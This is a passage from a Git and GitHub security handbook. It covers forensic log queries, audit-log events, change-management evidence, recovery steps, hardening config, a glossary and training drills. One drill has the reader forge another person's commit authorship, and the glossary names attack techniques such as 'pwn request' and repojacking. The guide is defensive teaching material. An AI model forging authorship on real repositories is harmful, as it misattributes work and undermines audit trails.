- [ ] Environments with required reviewers for production
- [ ] Build provenance attestations generated and **verified at deploy**; deploy by digest, never tag
- [ ] Approval required for outside-contributor workflow runs
- [ ] **Treat build logs as sensitive** — masking is best-effort string matching

---

## 21. Forensics and Audit Evidence

### Investigating a repository

```bash
# --- who and what ---
git log --all --format='%H|%an|%ae|%aI|%cn|%ce|%cI|%G?|%s'
#   %G? signature status: G good, B bad, U untrusted, N none, X expired, E cannot check

git log --all --show-signature
git log --diff-filter=A -- path/to/suspicious.sh   # when was it ADDED, and by whom
git log -S 'eval(' --all --oneline
git log --all --name-status --since='2026-01-01'

# --- author vs committer divergence: rebases, cherry-picks, or tampering ---
git log --format='%an <%ae> | %cn <%ce>' --all | sort | uniq -c | sort -rn

# --- timestamps that make no sense (authored AFTER committed) ---
git log --format='%aI %cI %H' --all | awk '$1 > $2'

# --- objects no branch points at ---
git fsck --full --unreachable --dangling
git cat-file -p <dangling-sha>

# --- local movement history, incl. force pushes and resets ---
git reflog --date=iso --all
cat .git/logs/HEAD

# --- integrity ---
git fsck --full --strict
git verify-pack -v .git/objects/pack/*.idx | tail -5
```

### Signals worth alerting on

- **Force push to a protected branch** — should be impossible. Misconfiguration or a bypass was used.
- **Author and committer emails differ** in a repo where rebasing is not the norm
- **Author timestamp in the future**, or before the repository existed
- **Changes to `.github/workflows/`, `CODEOWNERS`, or ruleset configuration** — especially off-hours
- **A new deploy key**, especially with write access
- **A PAT or SSH key created then used from a different geography within minutes**
- **A repository changing from private to public**
- **An org member escalated to owner**

### The platform side

Git tells you *what* changed. GitHub tells you *who*, from where, with which credential. You need
both, and **only the platform record is durable and non-repudiable**.

```bash
gh api /orgs/ACME/audit-log --paginate \
  -f phrase='action:protected_branch.policy_override' -f include=all
```

Events worth extracting regularly:

```
protected_branch.policy_override      # somebody used a bypass
protected_branch.destroy              # protection removed
repo.access                           # visibility changed
org.add_member / org.update_member    # membership and role changes
org.remove_outside_collaborator
repo.create_actions_secret
personal_access_token.*               # fine-grained token lifecycle
deploy_key.create
oauth_authorization.create
git.clone / git.push / git.fetch      # Git events (Enterprise Cloud only)
```

Enable **audit log streaming** to S3/Splunk/Event Hubs/Datadog — in-product retention is finite and
the UI is not an investigation tool.

### Producing change-management evidence

| Control objective | Evidence from GitHub | How to pull it |
|---|---|---|
| Changes authorised before deployment | PR with required approval, approver ≠ author | `gh pr list --state merged --json number,mergedAt,author,reviews` |
| Segregation of duties | Ruleset requiring non-author approval + approval of most recent push | Ruleset export + sample of merged PRs |
| Changes are tested | Required status checks passing at merge | `gh api /repos/{o}/{r}/commits/{sha}/check-runs` |
| Only authorised code reaches production | Environment protection rules + deployment records | `gh api /repos/{o}/{r}/deployments` |
| Controls cannot be silently bypassed | Bypass list contents + `policy_override` events | `gh api /repos/{o}/{r}/rules/branches/main` + audit log |
| Access appropriate and reviewed | Collaborators with permission levels, team membership | `gh api /repos/{o}/{r}/collaborators --paginate` |
| Access removed on termination | SCIM deprovisioning + `org.remove_member` events | Audit log correlated with the HR leaver list |
| Changes are attributable | Signed commits with verification status | `git log --format='%H %G? %GS'` across the release range |

> **THE FINDING ASSESSORS WRITE MOST OFTEN.** Not "there is no branch protection". It is **"branch
> protection exists but administrators are exempt"**, or "the required reviewer setting permits
> self-approval", or "the pipeline service account is on the bypass list". The control is present,
> documented, and does not constrain the population it needs to. **Start your review from the bypass
> list and work backwards.**

---

## 22. Recovery Playbook

**First rule: if it was ever committed, it almost certainly still exists.**

| Situation | Recovery |
|---|---|
| Committed to the wrong branch | `git switch right-branch`, `git cherry-pick <sha>`, then `git reset --hard HEAD~1` on the wrong one |
| Undo last commit, keep the work | `git reset --soft HEAD~1` |
| Bad commit already pushed to a shared branch | `git revert <sha>` — never rewrite shared history for a routine mistake |
| Deleted a branch | `git reflog` for the tip, then `git switch -c <name> <sha>` |
| Hard reset destroyed committed work | `git reflog`, then `git reset --hard HEAD@{n}` |
| Rebase went wrong mid-flight | `git rebase --abort`; if finished, `git reset --hard ORIG_HEAD` |
| Commits made on a detached HEAD | `git reflog`, then `git branch rescue <sha>` — before GC runs |
| Dropped a stash | `git fsck --unreachable \| grep commit`, inspect with `git show`, then `git stash apply <sha>` |
| Force-pushed over a colleague's work | Ask for their local `git reflog` and push the recovered tip. **This is why `--force-with-lease` exists** |
| Merge conflict panic | `git merge --abort` / `git rebase --abort` — returns you exactly to the pre-operation state |
| Committed a secret, not yet pushed | Amend or reset it away — **still rotate** if it touched a shared machine |
| Committed a secret and pushed | **ROTATE FIRST.** Then §18. Rewriting is step three, not step one |
| Repository corruption | `git fsck --full` to identify, then `git fetch <other-clone> --all`. **DVCS means the backup already exists** |
| Committed a huge file | Unpushed: `git reset --soft` and re-commit without it. Pushed: `git filter-repo --strip-blobs-bigger-than 10M` + full rewrite coordination |

### Before any risky operation

```bash
git branch backup-$(date +%F-%H%M)      # free, instant safety net
git stash push -u -m "pre-surgery"      # uncommitted work becomes a real commit
git bundle create ../repo.bundle --all  # single-file portable copy of everything
```

`git bundle` is underused: one file containing the entire repository that can be cloned from. An
excellent **evidence-preservation step at the start of an incident**, and an excellent airgap
transfer format.

---

## 23. Command Reference

### Configuration worth setting once

```bash
# identity
git config --global user.name  "Jane Dev"
git config --global user.email "jane@corp.example"

# per-directory identity — work email in ~/work, personal elsewhere
# in ~/.gitconfig:
[includeIf "gitdir:~/work/"]
    path = ~/.gitconfig-work

# safety and sanity
git config --global init.defaultBranch main
git config --global pull.ff only
git config --global push.default simple
git config --global push.autoSetupRemote true
git config --global fetch.prune true
git config --global rebase.autosquash true
git config --global rerere.enabled true
git config --global merge.conflictStyle zdiff3
git config --global diff.algorithm histogram
git config --global core.autocrlf input        # "true" on Windows

# security
git config --global commit.gpgsign true
git config --global tag.gpgSign true
git config --global transfer.fsckObjects true
git config --global fetch.fsckObjects true
git config --global receive.fsckObjects true
git config --global protocol.allow never
git config --global protocol.https.allow always
git config --global protocol.ssh.allow always
git config --global credential.helper manager

# see where a setting came from — invaluable when debugging
git config --list --show-origin --show-scope
```

### Aliases that earn their keep

```ini
[alias]
    lg       = log --oneline --graph --decorate --all
    st       = status -sb
    last     = log -1 --stat --show-signature
    unstage  = restore --staged
    amend    = commit --amend --no-edit
    outgoing = log @{u}..HEAD --oneline
    # every commit that ever touched a string, across all refs
    hunt     = "!f() { git log --all -S\"$1\" --oneline; }; f"
    # show unsigned commits on the current branch
    unsigned = "!git log --format='%h %G? %an %s' | grep -v '^[a-f0-9]* G'"
```

### Security-relevant commands, collected

| Command | Purpose |
|---|---|
| `git log --show-signature` | Verify signatures across a range |
| `git log --format='%H %G? %GS'` | Machine-readable signature status + signer per commit |
| `git verify-commit` / `verify-tag` | Verify one object; exit code usable in scripts |
| `git merge --verify-signatures` | Refuse to merge unsigned work |
| `git fsck --full --strict` | Full integrity check of the object database |
| `git fsck --unreachable --dangling` | Find objects no ref points at |
| `git log -S` / `-G` | When a string or pattern entered/left history |
| `git rev-list --objects --all` | Every object with its path, for history-wide scanning |
| `git cat-file --batch-all-objects --batch-check` | Type, size, id of every object incl. unreachable |
| `git reflog --date=iso --all` | Local timeline of every ref movement |
| `git bundle create` | Single-file forensic snapshot |
| `git filter-repo` | Rewrite history to purge paths or redact strings |
| `git log --cc --merges` | Reveal content introduced only in merge commits |
| `git diff --stat main...HEAD` | What a branch actually changes vs the merge base |
| `git blame -w -C -C -C` | Attribution surviving whitespace changes and code movement |
| `git bisect run` | Automatically find the commit that introduced a defect |

---

## 24. Glossary, Drills and Interview Questions

### Glossary

| Term | Meaning |
|---|---|
| **bare repository** | No working tree; only object store and refs. What lives on a server |
| **blob** | Object holding file content, with no name or metadata |
| **cherry-pick** | Replay one commit's changes as a new commit elsewhere |
| **detached HEAD** | HEAD pointing at a commit rather than a branch; new commits are unreferenced |
| **fast-forward** | Advancing a branch pointer without a merge commit; possible only without divergence |
| **gitlink** | The special tree entry recording a submodule's pinned commit |
| **HEAD** | Pointer to what you have checked out; usually a symbolic ref to a branch |
| **index** | The staging area — a complete proposed tree, stored as a binary file |
| **merge base** | The common ancestor both sides are compared against in a three-way merge |
| **Merkle tree** | Hash tree where each node's hash covers its children, giving tamper evidence |
| **object ID / OID** | The SHA-1 or SHA-256 hash naming an object |
| **packfile** | Many objects compressed together with deltas, produced by GC |
| **plumbing / porcelain** | Git's low-level scripting commands vs its human-facing ones |
| **pwn request** | Abusing `pull_request_target` + a checkout of the PR head to run untrusted code with secrets |
| **refspec** | A mapping `+src:dst` describing which refs a fetch/push moves and where |
| **reflog** | Local, timestamped log of every ref movement. Your undo buffer |
| **repojacking** | Claiming an abandoned `owner/repo` namespace others still reference |
| **rebase** | Replaying commits onto a new base as new objects with new hashes |
| **SLSA** | Graded framework for build integrity and provenance |
| **symbolic ref** | A ref whose content is the name of another ref, such as `HEAD` |
| **tree** | Object representing a directory: modes, hashes and names |
| **upstream** | The remote branch a local branch tracks |
| **worktree** | An additional checked-out working directory sharing one object store |

### Drills

Do these in a scratch repository. Each builds on the last.

1. **Build a commit by hand with plumbing only** — `git hash-object -w`, `git update-index`,
   `git write-tree`, `git commit-tree`, then `git update-ref refs/heads/main <sha>`. No `git add`,
   no `git commit`.
2. **Verify the hash formula** — reproduce `git hash-object` with only `printf` and `sha1sum`.
   Confirm the header is `blob <size>\0`.
3. **Lose and recover a commit** — commit on a detached HEAD, switch away, confirm it's unreachable
   with `git fsck --unreachable`, recover it from the reflog.
4. **Forge an authorship** — set `user.name`/`user.email` to someone else, commit, observe Git raises
   no objection. Then sign a commit and watch `%G?` change from `N` to `G`.
5. **Plant and hunt a secret** — commit a fake AWS key, make five more commits, delete the file, then
   find the original with `git log -S` and retrieve it with `git show <sha>:<path>`. Purge with
   `git filter-repo` and verify with `git rev-list --objects --all`.
6. **Create a conflict deliberately** and resolve it three ways: ours, theirs, and hand-merged with
   `zdiff3` so you can see the base.
7. **Compare merge and rebase on the same history** — do both on duplicate branches and diff the
   resulting graphs. Note the hash changes.
8. **Write a blocking pre-commit hook** rejecting a staged AWS key pattern; install via
   `core.hooksPath`; confirm it fires.
9. **Bisect a planted bug** — 20 commits, break something mid-way, find it with `git bisect run`.
10. **Audit a real repository** — clone something public and answer: are commits signed, who has
    pushed to the default branch, what do the workflows do, are actions SHA-pinned, does any workflow
    use `pull_request_target`, does any secret appear in history.

### Interview questions this document answers

1. What exactly is a commit, byte for byte, and what does its hash cover?
2. Why does Git give you integrity but not authenticity, and what closes the gap?
3. Explain `git reset --soft` vs `--mixed` vs `--hard` in terms of the three trees.
4. A secret was committed and pushed to a public repository an hour ago. Walk through your response, in order.
5. What is the difference between `pull_request` and `pull_request_target`, and why does it matter?
6. Why is pinning a GitHub Action to `@v3` insufficient?
7. A commit shows the green Verified badge on GitHub. What does that actually prove?
8. How would you demonstrate to an auditor that no unreviewed code reached production last quarter?
9. Branch protection is enabled on `main`. Name five ways code could still reach it without review.
10. What is a merge base, and how does a three-way merge use it?

---

## Further Reading

- **Pro Git**, chapter 10 (Git Internals) — the canonical explanation of the object model
- `git help gitrevisions`, `git help gitattributes`, `git help githooks`
- GitHub's *Security hardening for GitHub Actions* guide
- The **SLSA** specification — build integrity levels
- **OpenSSF Scorecard** — a machine-checkable version of much of §20
- CVE-2024-32002, CVE-2021-21300, CVE-2018-11235 — the clone-time RCE lineage

---

> **Closing observation.** Nearly every serious incident here comes from the same root: a system
> designed to make collaboration frictionless being asked to also serve as a security boundary. Git
> was built to trust its users and let maintainers judge patches by reading them. Everything that
> makes it safe at scale — signing, protection rules, provenance — was added on top of a model that
> assumes good faith. **Knowing which layer you are relying on, for any given guarantee, is most of
> the skill.**
